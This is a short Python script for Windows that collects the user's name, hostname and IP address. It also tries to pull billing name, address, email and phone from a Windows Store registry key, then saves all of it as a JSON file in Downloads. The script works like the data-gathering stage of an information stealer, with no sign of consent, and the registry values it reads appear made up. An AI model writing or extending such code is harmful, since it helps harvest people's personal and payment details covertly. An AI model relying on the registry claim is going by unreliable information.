import os
import json
import socket
import getpass
import winreg

# Collect data on the user of the computer
username = getpass.getuser()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Gather billing information from the registry
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\WindowsStore")
    billing_name, billing_type = winreg.QueryValueEx(key, "BillingName")
    billing_address, billing_type = winreg.QueryValueEx(key, "BillingAddress")
    billing_email, billing_type = winreg.QueryValueEx(key, "BillingEmail")
    billing_phone, billing_type = winreg.QueryValueEx(key, "BillingPhone")
except WindowsError:
    billing_name = None
    billing_address = None
    billing_email = None
    billing_phone = None

# Gather data into a dictionary
data = {
    "username": username,
    "hostname": hostname,
    "ip_address": ip_address,
    "billing_info": {
        "name": billing_name,
        "email": billing_email,
        "phone": billing_phone,
        "address": billing_address
    }
}

# Save data to a JSON file
json_data = json.dumps(data)

# Save JSON file to the Downloads directory
downloads_dir = os.path.expanduser("~/Downloads")
with open(os.path.join(downloads_dir, "user_data.json"), "w") as f:
    f.write(json_data)
